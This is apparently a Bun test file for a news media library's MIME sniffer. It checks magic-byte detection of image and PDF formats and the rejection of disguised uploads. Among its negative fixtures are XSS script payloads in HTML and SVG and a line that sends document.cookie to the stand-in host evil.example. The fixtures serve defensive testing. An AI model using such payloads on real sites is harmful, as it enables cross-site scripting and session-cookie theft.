import { describe, expect, test } from "bun:test";

import { sniffNewsMediaMimeType } from "../../src/modules/media-library/domain/media-mime-sniffer";

function bytesOf(...values: number[]): Uint8Array {
  return new Uint8Array(values);
}

describe("sniffNewsMediaMimeType (Issue #634)", () => {
  test("recognizes JPEG magic bytes", () => {
    expect(
      sniffNewsMediaMimeType(bytesOf(0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10))
    ).toBe("image/jpeg");
  });

  test("recognizes PNG magic bytes", () => {
    expect(
      sniffNewsMediaMimeType(
        bytesOf(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00)
      )
    ).toBe("image/png");
  });

  test("recognizes GIF87a and GIF89a magic bytes", () => {
    expect(
      sniffNewsMediaMimeType(
        bytesOf(0x47, 0x49, 0x46, 0x38, 0x37, 0x61, 0x00, 0x00)
      )
    ).toBe("image/gif");
    expect(
      sniffNewsMediaMimeType(
        bytesOf(0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x00, 0x00)
      )
    ).toBe("image/gif");
  });

  test("recognizes WebP (RIFF....WEBP) magic bytes", () => {
    const bytes = new TextEncoder().encode("RIFF\x00\x00\x00\x00WEBPVP8 ");
    expect(sniffNewsMediaMimeType(bytes)).toBe("image/webp");
  });

  test("returns undefined for an HTML payload disguised with a .jpg name/claimed mime type — the exact Issue #631 exploit scenario", () => {
    const html = new TextEncoder().encode(
      "<html><body><script>alert('xss')</script></body></html>"
    );
    expect(sniffNewsMediaMimeType(html)).toBeUndefined();
  });

  test("returns undefined for a JS payload", () => {
    const js = new TextEncoder().encode(
      "fetch('https://evil.example/steal?c=' + document.cookie)"
    );
    expect(sniffNewsMediaMimeType(js)).toBeUndefined();
  });

  test("returns undefined for empty/too-short input", () => {
    expect(sniffNewsMediaMimeType(new Uint8Array())).toBeUndefined();
    expect(sniffNewsMediaMimeType(bytesOf(0xff))).toBeUndefined();
  });

  test("returns undefined for an SVG payload (never allow-listed, doc §9)", () => {
    const svg = new TextEncoder().encode(
      "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"
    );
    expect(sniffNewsMediaMimeType(svg)).toBeUndefined();
  });
});

/**
 * ADR-0026 step 5c — the first non-image signature. These pin the property that
 * makes it safe to recognize a document format at all: recognizing is not
 * allowing. `media-r2-config.ts` keeps `application/pdf` out of the default
 * allow-list, and `decideNewsMediaFinalizeOutcome` checks that list separately.
 */
describe("PDF signature (ADR-0026 step 5c)", () => {
  test("recognizes a real PDF header", () => {
    const pdf = new TextEncoder().encode("%PDF-1.7\n%\xE2\xE3\xCF\xD3\n");
    expect(sniffNewsMediaMimeType(pdf)).toBe("application/pdf");
  });

  test("recognizes every PDF version, since the version digits are not parsed", () => {
    for (const version of ["1.0", "1.4", "1.7", "2.0"]) {
      const pdf = new TextEncoder().encode(`%PDF-${version}\n`);
      expect(sniffNewsMediaMimeType(pdf)).toBe("application/pdf");
    }
  });

  test("requires the hyphen — bare '%PDF' text is not a PDF", () => {
    // Without the hyphen in the signature, a text file whose first word happens
    // to be "%PDF" would sniff as a PDF.
    const notPdf = new TextEncoder().encode("%PDF is a file format.");
    expect(sniffNewsMediaMimeType(notPdf)).toBeUndefined();
  });

  test("HTML claiming to be a PDF still sniffs to undefined", () => {
    const html = new TextEncoder().encode("<html><script>alert(1)</script>");
    expect(sniffNewsMediaMimeType(html)).toBeUndefined();
  });

  test("a PDF header buried after other bytes is NOT recognized — the signature must be at offset 0", () => {
    const padded = new TextEncoder().encode("GARBAGE%PDF-1.7");
    expect(sniffNewsMediaMimeType(padded)).toBeUndefined();
  });
});
